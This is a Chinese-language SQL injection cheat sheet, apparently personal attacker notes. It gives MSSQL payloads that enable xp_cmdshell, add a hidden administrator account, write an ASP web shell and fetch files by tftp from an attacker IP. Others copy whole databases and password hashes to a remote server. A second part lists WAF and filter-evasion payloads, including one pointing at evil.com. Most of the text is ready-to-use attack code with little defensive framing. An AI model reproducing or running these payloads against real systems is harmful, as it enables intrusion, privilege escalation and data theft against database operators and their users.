	;EXEC master.dbo.sp_blank>_addextendedproc xp_blank>_cmdshell,c:\inetpub\wwwroot\xplog70.dll--
	
	反向PING自己实验
	;use master;declare @s int;exec sp_blank>_oacreate "wscript.shell",@s out;exec sp_blank>_oamethod @s,"run",NULL,"cmd.exe /c ping 192.168.0.1";--
	
	加帐号
	;DECLARE @shell INT EXEC SP_blank>_OACreate wscript.shell,@shell OUTPUT EXEC SP_blank>_OAMETHOD @shell,run,null, C:\WINNT\system32\cmd.exe /c net user jiaoniang$ 1866574 /add--
	
	创建一个虚拟目录E盘：
	;declare @o int exec sp_blank>_oacreate wscript.shell, @o out exec sp_blank>_oamethod @o, run, NULL, cscript.exe c：\inetpub\wwwroot\mkwebdir.vbs -w "默认Web站点" -v "e","e：\"--
	
	访问属性：（配合写入一个webshell）
	declare @o int exec sp_blank>_oacreate wscript.shell, @o out exec sp_blank>_oamethod @o, run, NULL, cscript.exe c：\inetpub\wwwroot\chaccess.vbs -a w3svc/1/ROOT/e +browse
	
	
	爆库 特殊_blank>技巧：:%5c=\ 或者把/和\ 修改%5提交
	and 0<>(select top 1 paths from newtable)--
	
	得到库名（从1到5都是系统的id，6以上才可以判断）
	and 1=(select name from master.dbo.sysdatabases where dbid=7)--
	and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6)
	依次提交 dbid = 7,8,9.... 得到更多的_blank>数据库名
	
	and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U) 暴到一个表 假设为 admin
	and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in (Admin)) 来得到其他的表。
	and 0<>(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin
	and uid>(str(id))) 暴到UID的数值假设为18779569 uid=id
	and 0<>(select top 1 name from bbs.dbo.syscolumns where id=18779569) 得到一个admin的一个字段,假设为 user_blank>_id
	and 0<>(select top 1 name from bbs.dbo.syscolumns where id=18779569 and name not in
	(id,...)) 来暴出其他的字段
	and 0<(select user_blank>_id from BBS.dbo.admin where username>1) 可以得到用户名
	依次可以得到_blank>密码。。。。。假设存在 user_blank>_id username ,password 等字段
	
	and 0<>(select count(*) from master.dbo.sysdatabases where name>1 and dbid=6)
	and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U) 得到表名
	and 0<>(select top 1 name from bbs.dbo.sysobjects where xtype=U and name not in(Address))
	and 0<>(select count(*) from bbs.dbo.sysobjects where xtype=U and name=admin and uid>(str(id))) 判断id值
	and 0<>(select top 1 name from BBS.dbo.syscolumns where id=773577794) 所有字段
	
	?id=-1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,* from admin
	?id=-1 union select 1,2,3,4,5,6,7,8,*,9,10,11,12,13 from admin (union，access也好用)
	
	得到WEB路径
	;create table [dbo].[swap] ([swappass][char](255));--
	and (select top 1 swappass from swap)=1--
	;Create TABLE newtable(id int IDENTITY(1,1),paths varchar(500)) Declare @test varchar(20) exec master..xp_blank>_regread @rootkey=HKEY_blank>_LOCAL_blank>_MACHINE, @key=SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\Virtual Roots\, @value_blank>_name=/, values=@test OUTPUT insert into paths(path) values(@test)--
	;use ku1;--
	;create table cmd (str image);-- 建立image类型的表cmd
	
	存在xp_blank>_cmdshell的测试过程：
	;exec master..xp_blank>_cmdshell dir
	;exec master.dbo.sp_blank>_addlogin jiaoniang$;-- 加SQL帐号
	;exec master.dbo.sp_blank>_password null,jiaoniang$,1866574;--
	;exec master.dbo.sp_blank>_addsrvrolemember jiaoniang$ sysadmin;--
	;exec master.dbo.xp_blank>_cmdshell net user jiaoniang$ 1866574 /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add;--
	;exec master.dbo.xp_blank>_cmdshell net localgroup administrators jiaoniang$ /add;--
	exec master..xp_blank>_servicecontrol start, schedule 启动_blank>服务
	exec master..xp_blank>_servicecontrol start, server
	; DECLARE @shell INT EXEC SP_blank>_OACreate wscript.shell,@shell OUTPUT EXEC SP_blank>_OAMETHOD @shell,run,null, C：\WINNT\system32\cmd.exe /c net user jiaoniang$ 1866574 /add
	;DECLARE @shell INT EXEC SP_blank>_OACreate wscript.shell,@shell OUTPUT EXEC SP_blank>_OAMETHOD @shell,run,null, C：\WINNT\system32\cmd.exe /c net localgroup administrators jiaoniang$ /add
	; exec master..xp_blank>_cmdshell tftp -i youip get file.exe-- 利用TFTP上传文件
	
	;declare @a sysname set @a=xp_blank>_+cmdshell exec @a dir c:\
	;declare @a sysname set @a=xp+_blank>_cm’+’dshell exec @a dir c:\
	;declare @a;set @a=db_blank>_name();backup database @a to disk=你的IP你的共享目录bak.dat
	如果被限制则可以。
	select * from openrowset(_blank>sqloledb,server;sa;,select OK! exec master.dbo.sp_blank>_addlogin hax)
	
	查询构造：
	Select * FROM news Where id=... AND topic=... AND .....
	adminand 1=(select count(*) from [user] where username=victim and right(left(userpass,01),1)=1) and userpass <>
	select 123;--
	;use master;--
	:a or name like fff%;-- 显示有一个叫ffff的用户哈。
	and 1<>(select count(email) from [user]);--
	;update [users] set email=(select top 1 name from sysobjects where xtype=u and status>0) where name=ffff;--
	;update [users] set email=(select top 1 id from sysobjects where xtype=u and name=ad) where name=ffff;--
	;update [users] set email=(select top 1 name from sysobjects where xtype=u and id>581577110) where name=ffff;--
	;update [users] set email=(select top 1 count(id) from password) where name=ffff;--
	;update [users] set email=(select top 1 pwd from password where id=2) where name=ffff;--
	;update [users] set email=(select top 1 name from password where id=2) where name=ffff;--
	上面的语句是得到_blank>数据库中的第一个用户表,并把表名放在ffff用户的邮箱字段中。
	通过查看ffff的用户资料可得第一个用表叫ad
	然后根据表名 ad得到这个表的ID 得到第二个表的名字
	
	insert into users values( 666, char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), char(0x63)+char(0x68)+char(0x72)+char(0x69)+char(0x73), 0xffff)--
	insert into users values( 667,123,123,0xffff)--
	insert into users values ( 123, admin--, password, 0xffff)--
	;and user>0
	;and (select count(*) from sysobjects)>0
	;and (select count(*) from mysysobjects)>0 //为access_blank>数据库
	
	枚举出数据表名
	;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status>0);--
	这是将第一个表名更新到aaa的字段处。
	读出第一个表，第二个表可以这样读出来（在条件后加上 and name<>刚才得到的表名）。
	;update aaa set aaa=(select top 1 name from sysobjects where xtype=u and status>0 and name<>vote);--
	然后id=1552 and exists(select * from aaa where aaa>5)
	读出第二个表，一个个的读出，直到没有为止。
	读字段是这样：
	;update aaa set aaa=(select top 1 col_blank>_name(object_blank>_id(表名),1));--
	然后id=152 and exists(select * from aaa where aaa>5)出错，得到字段名
	;update aaa set aaa=(select top 1 col_blank>_name(object_blank>_id(表名),2));--
	然后id=152 and exists(select * from aaa where aaa>5)出错，得到字段名
	
	[获得数据表名][将字段值更新为表名，再想法读出这个字段的值就可得到表名]
	update 表名 set 字段=(select top 1 name from sysobjects where xtype=u and status>0 [ and name<>你得到的表名 查出一个加一个]) [ where 条件] select top 1 name from sysobjects where xtype=u and status>0 and name not in(table1,table2,…)
	通过SQLSERVER注入_blank>漏洞建_blank>数据库管理员帐号和系统管理员帐号[当前帐号必须是SYSADMIN组]
	
	[获得数据表字段名][将字段值更新为字段名，再想法读出这个字段的值就可得到字段名]
	update 表名 set 字段=(select top 1 col_blank>_name(object_blank>_id(要查询的数据表名),字段列如:1) [ where 条件]
	
	绕过IDS的检测[使用变量]
	;declare @a sysname set @a=xp_blank>_+cmdshell exec @a dir c:\
	;declare @a sysname set @a=xp+_blank>_cm’+’dshell exec @a dir c:\
	
	1、 开启远程_blank>数据库
	基本语法
	select * from OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select * from table1 )
	参数: (1) OLEDB Provider name
	2、 其中连接字符串参数可以是任何端口用来连接,比如
	select * from OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;, select * from table
	3.复制目标主机的整个_blank>数据库insert所有远程表到本地表。
	
	基本语法：
	insert into OPENROWSET(SQLOLEDB, server=servername;uid=sa;pwd=123, select * from table1) select * from table2
	这行语句将目标主机上table2表中的所有数据复制到远程_blank>数据库中的table1表中。实际运用中适当修改连接字符串的IP地址和端口，指向需要的地方，比如：
	insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from table2
	insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _blank>_sysdatabases)
	select * from master.dbo.sysdatabases
	insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _blank>_sysobjects)
	select * from user_blank>_database.dbo.sysobjects
	insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _blank>_syscolumns)
	select * from user_blank>_database.dbo.syscolumns
	复制_blank>数据库：
	insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table1) select * from database..table1
	insert into OPENROWSET(SQLOLEDB,uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from table2) select * from database..table2
	
	复制哈西表（HASH）登录_blank>密码的hash存储于sysxlogins中。方法如下：
	insert into OPENROWSET(SQLOLEDB, uid=sa;pwd=123;Network=DBMSSOCN;Address=192.168.0.1,1433;,select * from _blank>_sysxlogins) select * from database.dbo.sysxlogins
	得到hash之后，就可以进行暴力破解。
	
	遍历目录的方法： 先创建一个临时表：temp
	;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
	;insert temp exec master.dbo.xp_blank>_availablemedia;-- 获得当前所有驱动器
	;insert into temp(id) exec master.dbo.xp_blank>_subdirs c:\;-- 获得子目录列表
	;insert into temp(id,num1) exec master.dbo.xp_blank>_dirtree c:\;-- 获得所有子目录的目录树结构,并寸入temp表中
	;insert into temp(id) exec master.dbo.xp_blank>_cmdshell type c:\web\index.asp;-- 查看某个文件的内容
	;insert into temp(id) exec master.dbo.xp_blank>_cmdshell dir c:\;--
	;insert into temp(id) exec master.dbo.xp_blank>_cmdshell dir c:\ *.asp /s/a;--
	;insert into temp(id) exec master.dbo.xp_blank>_cmdshell cscript C:\Inetpub\AdminScripts\adsutil.vbs enum w3svc
	;insert into temp(id,num1) exec master.dbo.xp_blank>_dirtree c:\;-- （xp_blank>_dirtree适用权限PUBLIC）
	写入表：
	语句1：and 1=(Select IS_blank>_SRVROLEMEMBER(sysadmin));--
	语句2：and 1=(Select IS_blank>_SRVROLEMEMBER(serveradmin));--
	语句3：and 1=(Select IS_blank>_SRVROLEMEMBER(setupadmin));--
	语句4：and 1=(Select IS_blank>_SRVROLEMEMBER(securityadmin));--
	语句5：and 1=(Select IS_blank>_SRVROLEMEMBER(securityadmin));--
	语句6：and 1=(Select IS_blank>_SRVROLEMEMBER(diskadmin));--
	语句7：and 1=(Select IS_blank>_SRVROLEMEMBER(bulkadmin));--
	语句8：and 1=(Select IS_blank>_SRVROLEMEMBER(bulkadmin));--
	语句9：and 1=(Select IS_blank>_MEMBER(db_blank>_owner));--
	
	把路径写到表中去：
	;create table dirs(paths varchar(100), id int)--
	;insert dirs exec master.dbo.xp_blank>_dirtree c:\--
	and 0<>(select top 1 paths from dirs)--
	and 0<>(select top 1 paths from dirs where paths not in(@Inetpub))--
	;create table dirs1(paths varchar(100), id int)--
	;insert dirs exec master.dbo.xp_blank>_dirtree e:\web--
	and 0<>(select top 1 paths from dirs1)--
	
	把_blank>数据库备份到网页目录：下载
	;declare @a sysname; set @a=db_blank>_name();backup database @a to disk=e:\web\down.bak;--
	
	and 1=(Select top 1 name from(Select top 12 id,name from sysobjects where xtype=char(85)) T order by id desc)
	and 1=(Select Top 1 col_blank>_name(object_blank>_id(USER_blank>_LOGIN),1) from sysobjects) 参看相关表。
	and 1=(select user_blank>_id from USER_blank>_LOGIN)
	and 0=(select user from USER_blank>_LOGIN where user>1)
	
	-=- wscript.shell example -=-
	declare @o int
	exec sp_blank>_oacreate wscript.shell, @o out
	exec sp_blank>_oamethod @o, run, NULL, notepad.exe
	; declare @o int exec sp_blank>_oacreate wscript.shell, @o out exec sp_blank>_oamethod @o, run, NULL, notepad.exe--
	
	declare @o int, @f int, @t int, @ret int
	declare @line varchar(8000)
	exec sp_blank>_oacreate scripting.filesystemobject, @o out
	exec sp_blank>_oamethod @o, opentextfile, @f out, c:\boot.ini, 1
	exec @ret = sp_blank>_oamethod @f, readline, @line out
	while( @ret = 0 )
	begin
	print @line
	exec @ret = sp_blank>_oamethod @f, readline, @line out
	end
	
	declare @o int, @f int, @t int, @ret int
	exec sp_blank>_oacreate scripting.filesystemobject, @o out
	exec sp_blank>_oamethod @o, createtextfile, @f out, c:\inetpub\wwwroot\foo.asp, 1
	exec @ret = sp_blank>_oamethod @f, writeline, NULL,
	<% set o = server.createobject("wscript.shell"): o.run( request.querystring("cmd") ) %>
	
	declare @o int, @ret int
	exec sp_blank>_oacreate speech.voicetext, @o out
	exec sp_blank>_oamethod @o, register, NULL, foo, bar
	exec sp_blank>_oasetproperty @o, speed, 150
	exec sp_blank>_oamethod @o, speak, NULL, all your sequel servers are belong to,us, 528
	waitfor delay 00:00:05
	
	; declare @o int, @ret int exec sp_blank>_oacreate speech.voicetext, @o out exec sp_blank>_oamethod @o, register, NULL, foo, bar exec sp_blank>_oasetproperty @o, speed, 150 exec sp_blank>_oamethod @o, speak, NULL, all your sequel servers are belong to us, 528 waitfor delay 00:00:05--
	
	xp_blank>_dirtree适用权限PUBLIC
	exec master.dbo.xp_blank>_dirtree c:返回的信息有两个字段subdirectory、depth。Subdirectory字段是字符型，depth字段是整形字段。
	create table dirs(paths varchar(100), id int)
	建表，这里建的表是和上面 xp_blank>_dirtree相关连，字段相等、类型相同。
	insert dirs exec master.dbo.xp_blank>_dirtree c:只要我们建表与存储进程返回的字段相定义相等就能够执行！达到写表的效果,一步步达到我们想要的信息！
##注入的经典方法
暴力猜解
逐字猜解
information_schema
	
爆错
时间延迟的盲注
bool类型的盲注


#SQL注入绕过WAF
http://netsecurity.51cto.com/art/201803/567738.htm
WAF区别于常规防火墙，因为WAF能够过滤特定Web应用程序的内容，而常规防火墙充当的则是服务器之间的安全门。通过检查HTTP流量，它可以防止源自Web应用安全漏洞的攻击，如SQL注入，XSS，文件包含和安全配置错误。

Web应用程序防火墙(WAF)的主要作用是过滤，监控和阻止各类进出Web应用程序的HTTP流量。WAF区别于常规防火墙，因为WAF能够过滤特定Web应用程序的内容，而常规防火墙充当的则是服务器之间的安全门。通过检查HTTP流量，它可以防止源自Web应用安全漏洞的攻击，如SQL注入，XSS，文件包含和安全配置错误。

##WAF是如何工作的?

协议异常检测：拒绝不符合HTTP标准的请求
增强的输入验证：代理和服务器端验证，而不仅仅是客户端验证
白名单和黑名单
基于规则和基于异常的保护：基于规则的更依赖黑名单机制，基于异常则更灵活
状态管理：关注会话保护还有：Cookie保护，反入侵规避技术，响应监控和信息披露保护。

##WAF的常见特征
之所以要谈到WAF的常见特征，是为了更好的了解WAF的运行机制，这样就能增加几分绕过的机会了。本文不对WAF做详
细介绍，只谈及几点相关的。
总体来说，WAF(Web Application Firewall)的具有以下四个方面的功能：
1. 审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话
2. 访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式
3. 架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。
4. WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应
用编程错误导致的安全隐患。
###WAF的常见特点：
	异常检测协议：拒绝不符合HTTP标准的请求
	增强的输入验证：代理和服务端的验证，而不只是限于客户端验证
	白名单&黑名单：白名单适用于稳定的We应用，黑名单适合处理已知问题
	基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活
	状态管理：重点进行会话保护
	另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等

###如果是对于扫描器，WAF有其识别之道：
扫描器识别主要由以下几点：

	1) 扫描器指纹(head字段/请求参数值)，以wvs为例，会有很明显的Acunetix在内的标识
	2) 单IP+ cookie某时间段内触发规则次数
	3) 隐藏的链接标签等(`<a>`)
	4) Cookie植入
	5) 验证码验证，扫描器无法自动填充验证码
	6) 单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404

##WAF探测
###拆散SQL语句：
通常的做法是：需要把SQL注入语句给拆散，来检查是哪个关键字被过滤了。比如，如果你输入的是
union+select语句，给你报了一个403或内部服务器错误，什么union不合法什么的，就知道过滤了哪些
了，也是常见的Fuzzing测试。这是制造bypass语句的前提
###冗长的报错：
当你的sql语法输入错误时、对方网站又没关闭错误回显的时候，会爆出一大堆错误，在php中更会爆出
敏感的网站根目录地址。aspx则会爆出整个语法错误详细信息。

	比如你输入的语法是：
	id=1+Select+1,2,3--
	会给你报出以下错误：
	Error at line 1 near " "+1,2,3--
	上面也说过了黑名单方式过滤，也可以采用以下方式进行绕过：
	sel%0bect+1,2,3
###异或注入攻击
异或注入
http://120.24.86.145:9004/1ndex.php?id=1'^(0)^ '
两个同为真的条件做异或，结果为假
两个同为假的条件做异或，结果为假
一个条件为真，一个条件为假，结果为真
null与任何条件（真、假、null）做异或，结果都为null
###大量数据填充

##如何绕过WAF?

1. 绕过大小写过滤
	当我们在目标URL进行SQL注入测试时，可以通过修改注入语句中字母的大小写来触发WAF保护情况。如果WAF使用区分大小写的黑名单，则更改大小写可能会帮我们成功绕过WAF的过滤。

		http://target.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4

2. 关键字替换
	(在关键字中间可插入将会被WAF过滤的字符) – 例如SELECT可插入变成SEL
	正则表达式替换或删除select、union等关键字，且只匹配一次

		http://target.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4
		同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT

3. 编码绕过
	+ URL encode  
	普通的URL编码可能无法实现绕过不过，存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过

			空格变为%20、单引号%27、左括号%28、右括号%29、百分号%25
			page.php?id=1%252f%252a*/UNION%252f%252a/SELECT
			page.php?id=1%2f%2a*/UNION%2f%2a/SELECT 一次解码
			page.php?id=1/**/UNION/*/SELECT   两次解码
	
	+ Hex encode
	
			target.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…//对单个字符十六进制编码
			SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) //对整个字符串编码
			常见的编码当然还有二进制、八进制
	
	+ Unicode encode
	
			?id=10%D6‘%20AND%2201=2%23   //%df绕过addslashes,逃逸'或",%D6同理，双字节绕过（也叫宽字节注入），比如对单引号转义操作变成\'，那么就变成了%D6%5C'，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用

			SELECT 'Ä'='A'; #1 //使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过
		
			utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下
		
		单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
		空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
		左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
		右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9

4. 使用注释

	在攻击字符串中插入注释。例如，/*!SELECT*/ 这样WAF可能就会忽略该字符串，但它仍会被传递给目标应用程序并交由mysql数据库处理。/**/在构造的查询语句中插入注释规避对空格的依赖或关键字识别。

		常见的注释符号：//, — , /**/, #, –+,–  -, ;–a
		index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4 //普通注释绕过过滤空格、tab等
		'union%a0select pass from users#  //%0b,%10等换行符
		index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 //内联
		?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4 //内联版本       //50000表示假如 数据库版本是5.00.00以上版本时，执行内联注释内的语句

5. 某些函数或命令，因为WAF的过滤机制导致我们无法使用。那么，我们也可以尝试用一些等价函数来替代它们。

	+ 函数或变量
	
			hex()、bin() ==> ascii()   
			sleep() ==>benchmark()   
			concat_ws()==>group_concat() 
			substr((select 'password'),1,1) = 0x70   
			strcmp(left('password',1), 0x69) = 1   
			strcmp(left('password',1), 0x70) = 0   
			strcmp(left('password',1), 0x71) = -1 
			mid()、substr() ==> substring()  
			@@user ==> user()  
			@@datadir ==> datadir() 

			举例：
		
				substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
				或者：substr((select 'password'),1,1) = 0x70
				strcmp(left('password',1), 0x69) = 1
				strcmp(left('password',1), 0x70) = 0
				strcmp(left('password',1), 0x71) = -1
			上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现，置于select、uinon、where等
				关键字被限制如何处理将在后面filter部分讨论

	+ 符号

			1. and和or有可能不能使用，或者可以试下&&和||能不能用；还有=不能使用的情况，可以考虑尝试<、>，因为如果不小于又不大于，那边是等于了
			
			2. 在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/ \t

	+ 生僻函数（updatexml（,select语句）、extractvalue（，）、floor()、NAME_CONST(适用于低版本)）

			MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x=_></script>’,’/script/@x/’,’src=//evil.com’);

			?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
			SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror)); //
			
			postgresql
			?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
			MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可
			能，而且代价太大，看来黑名单技术到一定程度便遇到了限制

6. 使用特殊符号
	这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法。

	+ \`symbol: select \`version()\`; 反引号，可以用来过空格和正则，特殊情况下还可以将其做注释符用
	+ +- :select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤
	+ @:select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量
	+ Mysql function() as xxx；也可不用as和空格
	+ `、~、!、@、%、()、[]、.、-、+ 、|、%00 
	+ 操作符供参考：>>, <<, >=, <=, <>,<=>,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN
	
	示例
	
		‘se’+’lec’+’t’   
		%S%E%L%E%C%T 1   
		1.aspx?id=1;EXEC(‘ma’+'ster..x’+'p_cm’+'dsh’+'ell ”net user”’)  
		' or --+2=- -!!!'2   
		id=1+(UnI)(oN)+(SeL)(EcT)	////另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔
		select-count(id)test from users;  //绕过空格限制

7. HTTP参数控制  
	通过提供多个参数=相同名称的值集来混淆WAF。例如 http://example.com?id=1&?id=’ or ‘1’=’1′ — ‘在某些情况下(例如使用Apache/PHP)，应用程序将仅解析最后(第二个) id= 而WAF只解析第一个。在应用程序看来这似乎是一个合法的请求，因此应用程序会接收并处理这些恶意输入。如今，大多数的WAF都不会受到HTTP参数污染(HPP)的影响，但仍然值得一试。

	+ HPP(HTTP Parameter Polution))

			/?id=1;select+1,2,3+from+users+where+id=1—   
			/?id=1;select+1&amp;id=2,3+from+users+where+id=1—   
			/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users 
		HPP又称做重复参数污染，最简单的就是?uid=1&uid=2&uid=3，对于这种情况，不同的Web服务器处理方式如下：

	+ HPF(HTTP Parameter Fragment)

		这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)

		/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--   
		select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— 

	+ HPC(HTTP Parameter Contamination)

		这一概念见于exploit-db上的paper：Beyond SQLi: Obfuscate and Bypass，Contamination同样意为污染
		RFC2396定义了以下字符：
		Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' () 
		Reserved : ; / ? : @ &amp; = + $ , 
		Unwise : { } | \ ^ [ ] ` 
		不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：
		以魔术字符%为例，Asp/Asp.net会受到影响



8. 缓冲区溢出

	WAF和其他所有的应用程序一样也存在着各种缺陷和漏洞。如果出现缓冲区溢出的情况，那么WAF可能就会崩溃，即使不能代码执行那也会使WAF无法正常运行。这样，WAF的安全防护自然也就被瓦解了。

		?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 

9. 整合绕过

	当使用单一的方式无法绕过时，我们则可以灵活的将多种方式结合在一起尝试。

		target.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…   

		id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -   

		?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- 

10. 闭合

		%df'
		'
		and '1'='1
		%23
		#
		-- 123
		#、–+用于终结语句的查询

11. 利用WAF逻辑漏洞

		比如你分析到最后，发现所有的*都被换成空白了，就意味着你不能使用内联注释了，union+select也会给你返回一个403错误，在这种情况下，你应该充分利用*被替换成空白：
			id=1+uni*on+sel*ect+1,2,3--+
		这样的话，*被过滤掉了，但是union+select被保留下来了。这是常见的WAF bypass技巧，当然不仅仅是union+select，其他的语法被过滤了都可以采用这种的。找到被替换的那个关键字，你就能找到绕过的方法

12. sql约束攻击

		1. 在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”
		2. 在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。
		3. 使用“vampire”与random_pass即可登录绕过
		4. 但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。

##SQLi Filter Evasion Cheat sheet
###Cheat sheet

	#注释
	‘ or 1=1#
	‘ or 1=1/* (MySQL < 5.1)
	' or 1=1;%00
	' or 1=1 union select 1,2 as `
	' or#newline
	' /*!50000or*/1='1
	' /*!or*/1='1
	#前缀
	+ – ~ !
	‘ or –+2=- -!!!’2
	#操作符：
	^, =, !=, %, /, *, &, &&, |, ||, , >>, <=, <=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, I
	S, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL
	#空格
	%20 %09 %0a %0b %0c %0d %a0 /**/
	‘or+(1)sounds/**/like“1“–%a0-
	‘union(select(1),tabe_name,(3)from`information_schema`.`tables`)#
	#有引号的字符串
	SELECT ‘a’
	SELECT “a”
	SELECT n’a’
	SELECT b’1100001′
	SELECT _binary’1100001′
	SELECT x’61′
	#没有引号的字符串
	‘abc’ = 0×616263
	' and substr(data,1,1) = 'a'#
	' and substr(data,1,1) = 0x61 # 0x6162
	' and substr(data,1,1) = unhex(61) # unhex(6162)
	' and substr(data,1,1) = char(97 )# char(97,98)
	' and substr(data,1,1) = 'a'#
	' and hex(substr(data,1,1)) = 61#
	' and ascii(substr(data,1,1)) = 97#
	' and ord(substr(data,1,1)) = 97#
	' and substr(data,1,1) = lower(conv(10,10,36))# 'a'
	#别名
	select pass as alias from users
	select pass`alias alias`from users
	#字型
	‘ or true = ’1 # or 1=1
	‘ or round(pi(),1)+true+true = version() # or 3.1+1+1 = 5.1
	‘ or ’1 # or true
	#操作符字型
	select * from users where ‘a’='b’='c’
	select * from users where (‘a’='b’)=’c’
	select * from users where (false)=’c’
	#认真绕过‘=’
	select * from users where name = ”=”
	select * from users where false = ”
	select * from users where 0 = 0
	select * from users where true#函数过滤器ascii (97)
	load_file/*foo*/(0×616263)
	#用函数构建字符串
	‘abc’ = unhex(616263)
	‘abc’ = char(97,98,99)
	hex(‘a’) = 61
	ascii(‘a’) = 97
	ord(‘a’) = 97
	‘ABC’ = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))
	#特殊字符
	aes_encrypt(1,12) // 4鏷眥"^z譎é蒃a
	des_encrypt(1,2) // 侴Ò/镏k
	@@ft_boolean_syntax // + -><()~*:""&|
	@@date_format // %Y-%m-%d
	@@innodb_log_group_home_dir // .\
	@@new: 0
